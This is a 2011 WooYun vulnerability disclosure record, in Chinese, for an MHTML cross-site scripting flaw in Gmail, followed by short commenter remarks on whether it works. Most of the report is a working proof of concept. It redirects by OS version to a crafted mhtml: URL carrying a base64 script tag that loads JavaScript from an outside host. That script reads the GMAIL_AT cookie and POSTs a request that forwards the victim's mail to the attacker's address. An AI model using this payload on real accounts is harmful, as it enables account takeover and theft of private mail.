{"id": 22970, "wybug_id": "wooyun-2011-02011", "wybug_title": "Gmail的XSS一枚", "wybug_corp": "Google.com", "wybug_author": "Jacks", "wybug_date": "2011-04-29 17:56", "wybug_open_date": "2011-04-29 18:18", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用", "类型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-04-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-04-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 还是跟mhtml有关.详细请看下面咯。 详细说明：  已经补掉了...现在放出给大家分享下完整的POC!   漏洞证明：  \n<script language=\"javascript\"> function detectOS() {\t     var sUserAgent = navigator.userAgent;\t\t var isWin = (navigator.platform == \"Win32\") || (navigator.platform == \"Windows\");\t\t\t\tif (isWin) {\t\t\tvar isWin2K = sUserAgent.indexOf(\"Windows NT 5.0\") > -1 || sUserAgent.indexOf(\"Windows 2000\") > -1;\t\t\tvar isWinXP = sUserAgent.indexOf(\"Windows NT 5.1\") > -1 || sUserAgent.indexOf(\"Windows XP\") > -1;\t\t\tvar isWin2003 = sUserAgent.indexOf(\"Windows NT 5.2\") > -1 || sUserAgent.indexOf(\"Windows 2003\") > -1;\t\t\tif (isWin2K || isWinXP ||isWin2003) document.location=\"mhtml:https://mail.google.com/support/bin/answer.py?answer=6576&cbid=-1vw2scem46j8f&src=cb&lev= index&answer=%250AContent-Location:viki%250aContent-Transfer-Encoding:base64%250D250DPHNjcmlwdCBzcmM9aHR0cDovL3d3dy5qYWNrcy5jb20vamFjay5qcz48L3NjcmlwdD4=!viki\";\t\t\t\t\t\tvar isWinVista = sUserAgent.indexOf(\"Windows NT 6.0\") > -1 || sUserAgent.indexOf(\"Windows Vista\") > -1;\t\t\tvar isWin7 = sUserAgent.indexOf(\"Windows NT 6.1\") > -1 || sUserAgent.indexOf(\"Windows 7\") > -1;\t\t\tif (isWin7 || isWinVista ) document.location=\"mhtml:https://mail.google.com/support/bin/answer.py?answer=6576&cbid=-1vw2scem46j8f&src=cb&lev= index&answer=%0AContent-Location:viki%0aContent-Transfer-Encoding:base640L0DPHNjcmlwdCBzcmM9aHR0cDovL3d3dy5qYWNrcy5jb20vamFjay5qcz48L3NjcmlwdD4=!viki\";\t\t} \t\t\treturn \"other\"; } detectOS(); </script>\nContent-Transfer-Encoding:后的需要base64编码.调用一个js.\n<script src=http://www.jacks.com/jack.js></script>\nJS代码如下：\ndocument.write('<iframe id=ifr width=0 height=0 onload=\"crosscookie()\" src=\"http://mail.google.com/mail/x/\"></iframe><img src=\"http://www.spypig.com/67fcfa37-4240-11e0-8986-00188be7649a/pig.gif\" width=0>');function crosscookie(){\tvar KEY = 'GMAIL_AT';\tvar MAIL = 'jacks@gmail.com'\tifr = ifr.contentWindow ? ifr.contentWindow : ifr.contentDocument;\tvar cookies = ifr.document.cookie.split(/\\s*;\\s*/);\tvar GMAIL_AT;\tvar IK;\tfor(var i = 0, len = cookies.length; i < len; i++){\t\tvar arr = cookies[i].split(/\\s*=\\s*/);\t\tif(arr[0] == KEY) {\t\t\tGMAIL_AT = arr[1];   \t\t}\t}\tvar xhr = new ifr.ActiveXObject('Microsoft.XMLHttp');\txhr.open('GET', 'https://mail.google.com/mail/', false);\txhr.send();\tvar source = xhr.responseText;\tvar reg = /GLOBALS=\\[/;\tvar result = reg.exec(source);\tvar pos = result.index + (result + '').length;\tvar len = source.length;\tvar l = 1;\tvar start = pos;\twhile(pos < len){\t\tvar c = source.charAt(pos);\t\tif(c === '[') {\t\t\tl++;\t\t} else if(c === ']'){\t\t\tl--;\t\t}\t\tif(l === 0) break;\t\tpos++;\t}\tIK = eval('[' + source.substring(start, pos) + ']')[9];\txhr.open('POST', 'https://mail.google.com/mail/?ui=2&ik=' + IK + '&view=mdlg&at=' + GMAIL_AT, false);\txhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\")\txhr.send('mdrp=1&mda=' + MAIL);\t document.location=\"http://www.xxxx.com/images/scan.jpg\";\t//window.close();}\n能做什么就不用我多说了把？   修复方案：  官方已经修复了,放出来,研究mail xss的人看吧!这类东西某些部门还是非常喜欢的!还是mhtml问题哈~   版权声明：转载请注明来源 Jacks@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-04-29 18:29 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  二手代码，非完整版本。在WIN7下mhtml协议里的AJAX请求也要同源，请求mhtml:https://mail.google.com/mail 这样的URL才有权限。    \n     2011-04-29 18:57 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  建议乌云修改下代码底色,来点浅灰色就行,    \n     2011-04-29 19:38 |    \t\tJacks \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:25        | ╮(╯▽╰)╭ 情何以堪  http://royalhack....)\t\t \n  RE:茄子这真的不是二手代码哟.. 真的不是非完整版本哟..    \n     2011-04-29 21:07 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  RE:Jacks 你没有实测过在WIN7下mhtml漏洞里AJAX的情况，原版的代码全考虑到了，你发的这个WIN7下跑不起来。当然现在说也没啥意思了，都补得不能再补的东西了。    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}